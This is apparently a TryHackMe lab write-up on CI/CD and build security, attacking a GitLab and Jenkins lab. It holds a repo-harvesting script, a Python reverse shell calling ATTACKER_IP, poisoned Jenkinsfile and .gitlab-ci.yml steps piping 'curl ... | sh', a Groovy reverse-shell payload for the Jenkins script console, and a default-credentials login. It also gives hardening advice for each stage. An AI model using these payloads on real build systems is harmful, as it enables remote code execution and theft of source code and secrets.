

## Task 1 : Introduction


Learn about CI/CD and build principles to safeguard your pipelines.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/32852a82-be3f-4ab3-b1c2-55370cc64204)

> No answer needed.

### Network diagram :

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/1b59ce2d-6bc1-4aee-8728-e1d16776009b)

So what does a typical CI/CD-enabled pipeline look like? The network diagram of this room helps a bit to explain this. Let's work through the different components that can be found in this pipeline:

- **Developer workstations** - Where the coding magic happens, developers craft and build code. In this network, this is simulated through your `AttackBox`.
- **Source code storage solution** - This is a central placeholder to store and track different code versions. This is the `Gitlab server` found in our network.
- **Build orchestrator** - Coordinates and manages the automation of the build and deployment environments. Both `Gitlab and Jenkins` are used as build servers in this network.
- **Build agents** - These machines build, test and package the code. We are using `GitLab runners and Jenkins agents` for our build agents.
- **Environments** - Briefly mentioned above, there are typically environments for development, testing (staging) and production (live code). The code is built and validated through the stages. In our network, we have both a `DEV and PROD` environment.

## Task 2 : Setting up

#### Configuring DNS -

Add the **Gitlab instance IP** & **Jenkins instance IP** to **/etc/hosts** file.

```bash
sudo echo <Gitlab IP> gitlab.tryhackme.loc >> /etc/hosts && sudo echo <Jenkins IP> jenkins.tryhackme.loc >> /etc/hosts
```

#### Contacting MU-TH-UR 6000 -

As you progress through this network, you must report your work to the **MU-TH-UR 6000 mainframe**, better known as **Mother**. You will have to register with Mother before you begin this perilous journey. SSH is being used for communication as detailed below:

| SSH Username | mother          |
|--------------|-----------------|
| SSH Password | motherknowsbest |
| SSH IP       | X.X.X.250       | 

```bash
┌──(kali㉿kali)-[~]
└─$ ssh mother@10.200.94.250           
The authenticity of host '10.200.94.250 (10.200.94.250)' can't be established.
ED25519 key fingerprint is SHA256:ZX6N5LWRYGSxe+QjwYod/inoO9SH9uMPZ33gTBY7c8s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.200.94.250' (ED25519) to the list of known hosts.
mother@10.200.94.250's password: 

A... warm.... welcome.... from...

 __  __ _   _     _____ _   _       _   _ ____     __    ___   ___   ___  _ 
|  \/  | | | |   |_   _| | | |     | | | |  _ \   / /_  / _ \ / _ \ / _ \| |
| |\/| | | | |_____| | | |_| |_____| | | | |_) | | '_ \| | | | | | | | | | |
| |  | | |_| |_____| | |  _  |_____| |_| |  _ <  | (_) | |_| | |_| | |_| |_|
|_|  |_|\___/      |_| |_| |_|      \___/|_| \_\  \___/ \___/ \___/ \___/(_)
                                                                            

Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:1
Please provide your THM username: Shebu                

=======================================
Thank you for checking-in with Mother for the CI/CD Network. Be careful, the are hostiles and androids about!
Please take note of the following details and please make sure to save them, as they will not be displayed again.
=======================================
Username: Shebu
Password: iwNOKQSF1xWTZDxP
MailAddr: Shebu@tryhackme.loc
IP Range: 10.200.94.0/24
=======================================

These details are now active.
Once you have performed the actions to take control of the Android's pipeline, please reestablish a connection to mother.
If your access is deemed worthy, mother will award you with a flag for your progress.

=======================================
Please note once again that the VPN server and Mother, 10.200.94.250, are not in-scope for this investigation.
Any attempts made against Mother will result in immediate termination of your contract.
Best of luck on your journey!

Thank you for talking to Mother, goodbye!
Connection to 10.200.94.250 closed.
```

## Task 3 : What is CI/CD and Build Security?

#### Fundamentals of CI/CD -

According to Gitlab, there are eight fundamentals for CI/CD:

- A single source repository - Source code management should be used to store all the necessary files and scripts required to build the application.
- Frequent check-ins to the main branch - Code updates should be kept smaller and performed more frequently to ensure integrations occur as efficiently as possible.
- Automated builds - Build should be automated and executed as updates are being pushed to the branches of the source code storage solution.
- Self-testing builds - As builds are automated, there should be steps introduced where the outcome of the build is automatically tested for integrity, quality, and security compliance.
- Frequent iterations - By making frequent commits, conflicts occur less frequently. Hence, commits should be kept smaller and made regularly.
- Stable testing environments - Code should be tested in an environment that mimics production as closely as possible.
- Maximum visibility - Each developer should have access to the latest builds and code to understand and see the changes that have been made.
- Predictable deployments anytime - The pipeline should be streamlined to ensure that deployments can be made at any time with almost no risk to production stability.

> 1. What element of a CI/CD pipeline coordinates and manages the automation of build and deployment environments? - `build orchestrators`
> 2. What element of a CI/CD pipeline builds, tests, and packages code? - `build agents`
> 3. What fundamental of CI/CD promotes developers in having access to the latest builds and code in order to understand and see the changes that have been made? - `maximum visibility`

## Task 4 : Creating your own Pipeline

#### Gitlab Registration -

We will start the process by creating an account on the GitLab instance. Navigate to http://gitlab.tryhackme.loc and select the Register Now option on the page. Fill in the required details to create your account and register.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/4581753e-222d-4252-9f59-692477112379)

Once done, we can log in to gitlab server.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/629b6b20-26ce-427e-8987-c3686c1ff9a0)

#### Project Creation -

Now that you have an account, the next step is to create a new project. Feel free to create some of your projects directly to play around with the feature. However, since we want to play around with pipelines, you can make a fork of an existing project that has been created for this purpose.

Click on the Your work tab, then the Explore option, and search for BasicBuild. You will see a project like this:

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/a4657ffd-41a8-4c38-bf05-41d3718d54e5)

Click on the project and then on Fork. For the project options, make sure to specify your username as the namespace and to set the project to Private.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/5701b5e8-ee40-43bf-9653-96a6c38c147b)

#### Understanding CI/CD Configuration -

In Gitlab, project automation is defined in the **.gitlab-ci.yml** file. This file contains the steps that will be performed automatically when a new commit is made to the repo. Understanding what the commands in this file do will be important on your journey of learning about build security. Let's take a look at the contents of the file.

**Stages**

GitLab CI files allow you to define various jobs. Each job has different steps that must be executed, as found in the script section of the job. Usually, there are three stages to any CI pipeline, namely the `build, test, and deploy stage`, but there can be more. Let's take a look at the **build job** in **.gitlab-ci.yml** :

```yml
build-job:
  stage: build
  script:
    - echo "Hello, $GITLAB_USER_LOGIN!"
```

- Only an **echo** command will execute for this build job.
- However, developers normally complete all the build activities in the build stage, such as loading dependencies and compiling the code.
- Since we are deploying a simple PHP website, there is no reason for code compiling

**Tests**

- Tests jobs are meant to perform tests on the build to ensure everything works as expected.
- Usually, devs would execute more than one test job to ensure that they can individually test portions of the application.
- If one test job fails, the other test jobs will still continue, allowing devs to determine all the issues with the current build, rather than having to do multiple builds.

Let's take a look at the two test cases:

```yml
test-job1:
  stage: test
  script:
    - echo "This job tests something"

test-job2:
  stage: test
  script:
    - echo "This job tests something, but takes more time than test-job1."
    - echo "After the echo commands complete, it runs the sleep command for 20 seconds"
    - echo "which simulates a test that runs 20 seconds longer than test-job1"
    - sleep 20
```

As you can see, we don't have anything to test with our simple PHP web application. However, we can simulate that one test case will take longer than the other.

**Deployment**

In the deployment stage, we want to deploy our application to the relevant environment if both the build and test stages succeed. Usually, branches are used in source code repos, with the main branch being the only one that can deploy to production. Other branches will deploy to environments such as **_DEV or UAT_**. Let's take a look at what we are doing in the deployment job:

```yml
deploy-prod:
  stage: deploy
  script:
- echo "This job deploys something from the $CI_COMMIT_BRANCH branch."
    - echo "Making the website directory"
    - mkdir -p /tmp/time/cicd
    - echo "Copying the website files"
    - cp website_src/* /tmp/time/cicd/
    - echo "Hosting website using a screen"
    - screen -d -m php -S 127.0.0.1:8081 -t /tmp/time/cicd/ &    
    - echo "Deployment complete! Navigate to http://localhost:8081/ to test!"
  environment: production
```

- The first step of the deploy job is to create a new directory under **/tmp/** where we can place our web application.
- We then copy the web application files to the directory and alter the permissions of the files.
- Once done, host the application, making use of PHP. Now, we are ready to launch our application!
- CI files can become a lot more complex as there are a lot more sections and keywords that you could use.

 Now that we better understand the embedded automation, let's look at actually using it. To have the build execute, we need to register a **runner**.

**Runner Registration**

In Gitlab, we use **runners to execute the tasks configured in the project**. 

In our project, click on Settings and then CI/CD:

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/a47289ae-7595-4c45-85e0-8e3156a53562)

Expand the Runners section, 

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/40a591ee-5bc9-4ef2-be1e-6d7d7f0c23a1)

Here, we will be able to _configure a new runner_ for your project. 

### Download & install binary :

```bash
┌──(kali㉿kali)-[~]
└─$ sudo curl -L --output /usr/local/bin/gitlab-runner https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-linux-amd64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 62.2M  100 62.2M    0     0  58167      0  0:18:41  0:18:41 --:--:-- 52452
                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sudo chmod +x /usr/local/bin/gitlab-runner

[sudo] password for kali: 
                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sudo useradd --comment 'GitLab Runner' --create-home gitlab-runner --shell /bin/bash
                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sudo gitlab-runner install --user=gitlab-runner --working-directory=/home/gitlab-runner
Runtime platform                                    arch=amd64 os=linux pid=5103 revision=535ced5f version=16.11.1
                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sudo gitlab-runner start
Runtime platform                                    arch=amd64 os=linux pid=5337 revision=535ced5f version=16.11.1
```

### Register a runner -

```bash                                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ sudo gitlab-runner register --url http://gitlab.tryhackme.loc/ --registration-token GR1348941cKb13-SjqLAV7c6NpGqC
Runtime platform                                    arch=amd64 os=linux pid=5523 revision=535ced5f version=16.11.1
Running in system-mode.                            
                                                   
Enter the GitLab instance URL (for example, https://gitlab.com/):
[http://gitlab.tryhackme.loc/]: 
Enter the registration token:
[GR1348941cKb13-SjqLAV7c6NpGqC]: 
Enter a description for the runner:
[kali]: runner-kali
Enter tags for the runner (comma-separated):
production
Enter optional maintenance note for the runner:

WARNING: Support for registration tokens and runner parameters in the 'register' command has been deprecated in GitLab Runner 15.6 and will be replaced with support for authentication tokens. For more information, see https://docs.gitlab.com/ee/ci/runners/new_creation_workflow 
Registering runner... succeeded                     runner=GR1348941cKb13-Sj
Enter an executor: custom, shell, virtualbox, docker-windows, instance, docker-autoscaler, ssh, parallels, docker, docker+machine, kubernetes:
shell

Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded!
 
Configuration (with the authentication token) was saved in "/etc/gitlab-runner/config.toml"
```
Now when we refresh the page, we can see the runner.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/b6a8f4c9-68f7-4d0e-bc79-0e15b59d7139)

Our runnner will only run jobs without any tags. It is made so since our lab environment doesnt have any job with tags.

Since we have a simple job, we can just tell our runner to execute all jobs. Click the little pencil icon and click Run untagged jobs & Save:

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/d85a1926-8e6e-42b7-b4c9-1524370773a1)

**Build Automation**

Now that the runner is registered, we can test the build process by making a new commit. The easiest change to make that would kick off a build is to update the _README.md_ file.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/76ce209f-f341-4b98-8548-a4b39d896b0e)

Once done, our build process will have started! We can follow the process by clicking on `Build` and then `Pipelines`.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/769d5131-31fe-4187-9823-c9473f022ff1)

Once completed, our application will have been deployed! We can verify this by navigating to http://127.0.0.1:8081/, and we should be met by the web application homepage.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/d43834d4-f850-4ff8-8146-77a099315fa4)


_We have now created our very own CI/CD pipeline and build process!_

> 1. What is the name of the build agent that can be used with Gitlab? - `Gitlab runner`
> 2. What is the value of the flag you receive once authenticated to Timekeep? - `THM{W*********ines}`

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/48333c21-c24a-4072-a243-f2ea8ad508f4)

## Task 5 : Securing the Build Source 

### Source Code Security -

The **first step to securing the pipeline and the build is to secure the source**. In the event that a threat actor can compromise the source of our build, they are in a position to compromise the build itself. We want to protect our source code from the following two main issues:

- _**Unauthorised Tampering**_ - This is the simplest issue of the two. Only authorised users should be able to make changes to the source code. This means that we want to control who has the ability to push new code to our repo.
- _**Unauthorised Disclosure**_ - This is a bit more tricky. Depending on the application, the source code itself might be considered sensitive. For example, Microsoft would not like to disclose the source code of Word since that is their intellectual property. In cases where the source code is sensitive, we must ensure we do not intentionally disclose it. This issue is a lot more common to find.

### Confusion of responsibilities -

**First misconfiguration**

_One such mistake is that organisations can leave registration for their Gitlab instance open. Not open to the internet (although this has also happened before), but open to any user on their internal network to register a profile. This was simulated in the previous task by allowing you to register your own Gitlab profile._

An organisation might have 10,000 employees, of which 2000 may be working as developers and need access to Gitlab. In essence, our attack surface has grown by 500%! **_If a single employee of our bank is compromised, an attacker would have the ability to register a profile and exfiltrate any publicly shared repos._**

**Second misconfiguration**

Developers of our bank may believe that because the Gitlab instance is only accessible internally, it is okay to configure repos to be shared publicly. This means that any user who has a valid Gitlab account will be able to view the repo. While they may perhaps not be able to alter the code, remember, in this example, the code itself is seen as the IP of the bank. This confusion between who is responsible for securing the source code can lead to sensitive information being disclosed to the threat actor. Let's take a look at how this can be exploited!

### Exploiting a vulnerable build source -

To efficiently enumerate publicly visible repos, we will make use of the Gitlab API and a Python script as follows:

```python
import gitlab
import uuid

# Create a Gitlab connection
gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='glpat-kRQ4GbynTxySZRJLLx7w')
gl.auth()

# Get all Gitlab projects
projects = gl.projects.list(all=True)

# Enumerate through all projects and try to download a copy
for project in projects:
    print ("Downloading project: " + str(project.name))
    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
    UID = str(uuid.uuid4())
    print (UID)
    try:
        repo_download = project.repository_archive(format='zip')
        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
            output_file.write(repo_download)
    except Exception as e:
        # Based on permissions, we may not be able to download the project
        print ("Error with this download")
        print (e)
        pass
```

**Gitlab does not allow for its API to be interfaced with using credentials, as this is deemed insecure**. Therefore, to use the script, we will first have to generate an API token for our account.

> We can get the access token by going to _Profile -> Preferences -> Access Token_

Now we can use the script to successfully clone all the repos,

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/213953d9-af23-4d5e-a187-bce375910d8e)


```bash
┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
└─# python3 enumerate.py              
Downloading project: Basic Build
c09d2b12-1a89-4d03-95d3-d432fb442df7
Downloading project: Approval Test
4a57f04f-94ba-4b9f-a025-1720e4df4056
Downloading project: Merge Test
58bb12e0-ca5a-4571-ac2f-36e83595a129
Downloading project: Basic Build
9e2c0ebb-172c-48c3-9e79-629821abbb4b
Downloading project: Mobile App
1006c61c-eeca-4b02-b8ba-1b138538eb4e

┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
└─# ls
'Approval Test_4a57f04f-94ba-4b9f-a025-1720e4df4056.zip'  'Basic Build_c09d2b12-1a89-4d03-95d3-d432fb442df7.zip'  'Merge Test_58bb12e0-ca5a-4571-ac2f-36e83595a129.zip'
'Basic Build_9e2c0ebb-172c-48c3-9e79-629821abbb4b.zip'     enumerate.py                                           'Mobile App_1006c61c-eeca-4b02-b8ba-1b138538eb4e.zip'

```
Now we can unzip all the zip files & use `grep -R` to search for hardcodede API keys which is the flag.

```bash
┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security/unzip]
└─# grep -R "API" ./   
./mobile-app-master-7a790d318f6ff34861b7903cf61d1810b67cf741/Dockerfile:ENV ANDROID_API_KEY "THM{Y*********Key}"
./mobile-app-master-7a790d318f6ff34861b7903cf61d1810b67cf741/README.md:up your secret API key. The stub code is here for that, but please see our
./mobile-app-master-7a790d318f6ff34861b7903cf61d1810b67cf741/app/app.iml:    <orderEntry type="jdk" jdkName="Android API 28 Platform" jdkType="Android SDK" />
```

### Securing the Build Source -

Granular access control is crucial to managing repositories and the GitLab platform. It involves defining specific permissions and restrictions for different users or groups, ensuring that only authorised individuals have the appropriate level of access to sensitive resources. This helps maintain security, confidentiality, and effective collaboration within a development environment.

In GitLab, group-based access control is a powerful mechanism that simplifies permissions management across multiple repositories and projects. Here's how it works:

- **Group-Based Access Control:** GitLab allows you to organise projects into groups. Instead of managing access for each project separately, you can set permissions at the group level. This means that the same access rules apply to all projects within the group, making it easier to maintain consistent security policies. For example, you can create a group for the development team and define permissions, such as who can view, edit, or contribute to projects within that group. This approach streamlines access management and reduces the chances of errors or oversights when configuring permissions for individual repositories.
- **Access Levels :** GitLab offers different access levels, such as Guest, Reporter, Developer, Maintainer, and Owner. Each level comes with specific capabilities and permissions. Assigning the appropriate access level to each user or group ensures they have the necessary privileges without granting unnecessary permissions.
- **Sensitive Information Protection :** One critical consideration is preventing the accidental exposure of sensitive information. GitLab provides features to help with this:
1. **GitLab's .gitignore :** This file specifies which files or directories should be excluded from version control. It's crucial for preventing sensitive data like passwords, API keys, and configuration files from being committed to repositories.
2. **Environment Variables :** GitLab allows you to define and manage environment variables securely, separate from the source code. This is especially useful for storing sensitive data needed during the CI/CD process without exposing it in the repository.
3. **Branch Protection :** Branches, like master or main, can be protected to prevent direct pushes, ensuring that changes go through code review and automated testing before merging.

> 1. Which file specifies which directories and files should be excluded for version control? - `.gitignore`
> 2. What can you protect to ensure direct pushes and vulnerable code changes are avoided? - `branches`
> 3. What issue does lack of access control and unauthorised code changes lead to? - `Unauthorised Tampering` 
> 4. What is the API key stored within the Mobile application that can be accessed by any Gitlab user? - `THM{You**********Key}`


## Task 6 : Securing the Build Process

### Managing Dependencies -

During this compilation process, the build pipeline will gather some dependencies to perform the build. There are two main concerns for our build process when it comes to dependencies:

- **Supply Chain Attacks** - If a threat actor can take over one of these dependencies, they would be able to inject malicious code into the build
- **Dependency Confusion** - If an internally developed dependency is used, an attacker could attempt a dependency confusion attack to inject code into the build process itself.


### Knowing When to Start the Build -

- **What actions start the build process** - Normally, by default, a commit of new code to the source will start the pipeline. But we do have the ability to provide a much more granular configuration. For example, we can decide that only commits to specific branches, such as main, should start the pipeline.
- **Who can start the build process** - Once we decide which actions can start the build process, we need to narrow down who can perform these actions. As mentioned before, the pipeline only executes when code is merged to the main branch; this can be a very small list of users who have the ability to approve these merges. 
- **Where will the build occur** - Lastly, we need to decide where the build will occur. We don't have to simply rely on a single build agent to perform all of our builds. In the above example, if we want developers to run builds on other branches, we can just simply register a new build agent that will run a build in a different environment than the build agent of the main branch.

### Exploiting a Merge Build -

_Readme.md_ of Ash's gitlab repo for android build - http://gitlab.tryhackme.loc/ash/Merge-Test

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/a6e88bc7-0f50-4669-83de-ec0f0e197c24)

Ash is getting tired of users making merge requests to his code, only for it to break his pipelines! To combat this, he has enabled _on-merge builds_. This means that a build will be executed to test the merge code as soon as a merge request is made. This is a very common configuration. Certain CI/CD software, such as Jenkins, enables this by default! The issue, however, is that this could lead to a compromise. 

Reviewing the source code, we see that Ash uses a **_Jenkinsfile_**. This is a CI/CD script that will be executed by Jenkins through a webhook. **Effectively, when certain actions are performed, such as a merge request is opened, or code is pushed to a branch, Gitlab will notify Jenkins of the change through a webhook. Jenkins would then pull the source code and execute the steps listed in the Jenkinsfile before providing feedback to Gitlab on the outcome of the build.**

- However, this is also what creates the issue. **If a merge request is going to be built and any user can modify both the source code and the CI/CD Jenkinsfile, it means that users can cause the build agent to build malicious code.**


To perform this process, we will first need to fork Ash's repo. 
1. Navigate to the repo and press the Fork option.
2. Select your namespace, mark the project as Private, and select Fork project.
3. Alter the Jenkinsfile (**CI/CD pipelines are often just code execution as a feature**, and we can leverage this by updating the Jenkinsfile to simply execute a shell for us! )
4. Create a `shell.sh` script with the following contents in our attacker machine & host it using - `python3 -m http.server 8080`
```python
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```
5. Edit the _Jenkinsfile_ with the following contents & commit the file:
```yml
pipeline {
    agent any
    stages {
       stage('build') {
          steps {
              sh '''
                    curl http://ATTACKER_IP:8080/shell.sh | sh
                '''                 
              }             
          }
       }       
    }
```
6. To have Jenkins execute our now malicious _Jenkinsfile_, we need to create a merge request.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/8eaeb9e6-4474-4679-9643-6679caf1afec)

Bingo ! The jenkins server executed our code & we got our shell  🙌

```bash
┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
└─# nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.50.75.24] from (UNKNOWN) [10.200.94.171] 36530
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),119(netdev),120(lxd)
```

### Protecting the build process

Protecting the build process is key to ensuring vulnerabilities are avoided at the start of the code lifecycle. An insecure build can enable living-off-the-land attacks, supply chain attacks and a lot of trouble that is difficult to detect later in the pipeline. Here are some best practices to follow, which knit together what has been discussed in the previous tasks:

- **Isolation and Containerisation:** Run builds in isolated containers to prevent interference and maintain consistency.
- **Least Privilege:** Grant minimal permissions to CI/CD tools, restricting unnecessary access to sensitive resources.
- **Secret Management:** Use CI/CD tools' secret management features to store and inject sensitive data securely.
- **Immutable Artifacts:** Store build artifacts in a secure registry to prevent tampering and enable easy auditing.
- **Dependency Scanning:** Integrate dependency scanning to identify and address vulnerabilities in third-party libraries.
- **Pipeline as Code:** Define CI/CD pipelines as code, version-controlled alongside the source code.
- **Regular Updates:** Keep CI/CD tools and dependencies up to date to address known vulnerabilities.
- **Logging and Monitoring:** Monitor build logs for unusual activities and integrate them with security monitoring systems.

> 1. Where should you store artefacts to prevent tampering? - `secure registry`
> 2. What mechanism should you always use to store and inject sensitive data? - `secret management`
> 3. What attack can malicious actors perform to inject malicious code in the build process? - `Dependency Confusion`
> 4. Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? - `THM{77**********31c3}`

## Task 7 : Securing the Build Server

The next point of attack is the build server itself! If an attacker can gain access or control of our build server, this places them in quite a privileged position to compromise both the pipeline and the build.

### Build Server Basics -

The simplest point to start is with access. Even in modern times, a common attack against build infrastructure is to _guess credentials and gain access_. Whenever a Jenkins server is available in oopen internet, suprisingly  many times `jenkins:jenkins` would do the trick!

To secure our build server, we want to restrict access to it. You would often find that multiple members have access to the same build server. In these cases, we need to apply granular access to ensure that a compromise of one user would not lead to the compromise of all builds.

### Exposed Build Server -

Jenkins build server is at - http://jenkins.tryhackme.loc:8080/

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/1d5a8813-f5b3-47c9-b07c-ccdc62ae7b5d)

We can login with default credentials - `jenkins:jenkins`

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/c3ea6b6e-c0d3-4a6c-a383-a2104747be6d)

We can use the Jenkins script console (http://jenkins.tryhackme.loc:8080/script) to get a reverse shell on the Jenkins server.

**Reverse shell payload:**
```groovy
String host="10.xx.xx.xx";int port=9001;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/5666b13c-8220-499f-95c9-d4d598def8eb)

Once we click **Run**, we get a reverse shell back to our machine.

```bash
┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
└─# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.50.75.24] from (UNKNOWN) [10.200.94.160] 37584

jenkins@ip-10-200-94-160:/flag$ id
id
uid=115(jenkins) gid=123(jenkins) groups=123(jenkins)
```

### Protecting the Build Server -

The following steps can be followed to protect both your build server and build agents:

- **Build Agent Configuration:** Configure build agents to only communicate with the build server, avoiding external exposure.
- **Private Network:** Place build agents within a private network, preventing direct internet access.
- **Firewalls:** Employ firewalls to restrict incoming connections to necessary Build server-related traffic.
- **VPN:** Use a VPN to access the build server and its agents securely from remote locations.
- **Token-Based Authentication:** Utilise build agent tokens for authentication, adding an extra layer of security.
- **SSH Keys:** For SSH-based build agents, use secure SSH keys for authentication.
- **Continuous Monitoring:** Regularly monitor build agent activities and logs for unusual behaviour.
- **Regular Updates:** Update both the build server and agents with security patches.
- **Security Audits:** Conduct periodic security audits to identify and address vulnerabilities.
- **Remove Defaults and Harden Configuration:** Make sure to harden your build server and remove all default credentials and weak configurations.

> 1. What can be used to ensure that remote access to the build server can be performed securely? - `vpn`
> 2. What can be used to add an additional layer of authentication security for build agents? - `Token-based authentication`
> 3. Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2? - `THM{1769f7*********15cc}`

## Securing the Build Pipeline :

Even if we do everything correctly, **we still have to consider that one of our developers may be compromised**. Whether the actual developer is compromised through a _social engineering attack_ or _simply their credentials being exposed_, this compromise could be the downfall of our pipeline and build. Fortunately, there are protections that can be applied!

### Access Gates -

Access gates, also known as gates or checkpoints, serve as "stages" within a software development pipeline. They ensure that code progresses through the pipeline only after meeting predefined quality and security criteria. 

### The Two-Person Concept -

Even if we have access gates, we need to ensure that no single user can pass these access gates. **If we are the developer who initiated the build, we should be prevented from passing the next access gate.** This should always be someone else. By enforcing this with a technical control, it can be assured that in the event that a developer is compromised, a build cannot be pushed through. This is referred to as the two-person rule.

### Exploiting Misconfigured Access Gates -

Creds for Ana user - `anatacker:Password1@`

_Ash has provided Ana with developer access to his Approval-Test repo, which can be found here: http://gitlab.tryhackme.loc/ash/approval-test. _

To protect the main branch of the repo, Ash has configured the main branch to be a protected branch, where developers are only allowed to make merge requests and no direct code changes.

Let's test this by updating the README file and trying to commit the change to the main branch. Navigate to the README file and click Edit:

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/32cc2257-e9bd-4fbf-85ed-20b39e264146)

Now  Gitlab is automatically requesting that we start a merge request with the changes we want to make. We will also see that we cannot unselect the option to commit directly. Make a small change to the file and click Commit changes:

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/36ed1eb2-3502-4786-9598-3a93a3a43cea)

> Ash's thought process behind this was that it would protect the main branch, as the _company has a policy that states merge requests must be approved by a manager_. Since we are now
> forced to make a merge request, the main branch is protected. However, Ash has made the following two errors in his security thought process:

- Policies that are not enforced through a technology will not be respected by attackers. Sure, the policy says that a manager must approve the merge request, but if you read the merge request, you will see that from a technical standpoint, Gitlab indicates that approval is optional.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/207b79da-a881-412c-aa1d-fc720300b370)

- Although the main branch is protected by not allowing any direct pushes, since developers can still make merge requests, they can simply push their own merge request to commit code to the main branch. The two-person principle was not implemented to ensure that another person has to accept the merge request.

Leveraging these mistakes, as an attacker, you can simply approve your own merge request (though it isn't even needed) and you can then merge it to the main branch, as shown below!

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/1a059cf7-63a9-4362-899d-ea98126f4fff)


Reviewing the code in the main branch, we have made a change to the main branch! 

Now comes the fun part. **The GitLab runner was configured to only run on the main branch. Since we can now push code to the main branch, we can compromise the runner**. 

Now that we know how to get your code to the main branch, make some changes to the .**_gitlab-ci.yml*_* file to get code execution on the runner. 

Modify the **_.gitlab-ci.yml_** file with the following contents:

```yml
   production:
     stage: deploy
     script:
       - 'echo "Starting translator engine.... Please stand by...."'
       - curl http://10.50.75.24:8080/shell.sh | sh
     environment:
       name: ${CI_JOB_NAME}
```

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/8d188e83-e107-4204-91e1-adbc9a24faf0)

To make the Gitlab runner run our malicious reverse shell code, we need to merge it to main branch by ourself.

- Approve the request by ourselves.
- Select _Merge Immediately_ option.

Once the runner executes our code, we get a reverse shell back on our machine.

```bash
┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
└─# nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.50.75.24] from (UNKNOWN) [10.200.94.201] 52826
/bin/sh: 0: can't access tty; job control turned off

gitlab-runner@ip-10-200-94-201:~/builds/RYStXjj2/0/ash/approval-test$ id
id
uid=1001(gitlab-runner) gid=1001(gitlab-runner) groups=1001(gitlab-runner)
```

> 1. What can we add so that merges are raised for review instead of pushing the changes to code directly? - `merge requests`
> 2. What should we do so that only trusted runners execute CI/CD jobs? - `limit runner access`
> 3. Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3? - `THM{2411*********503e6}`

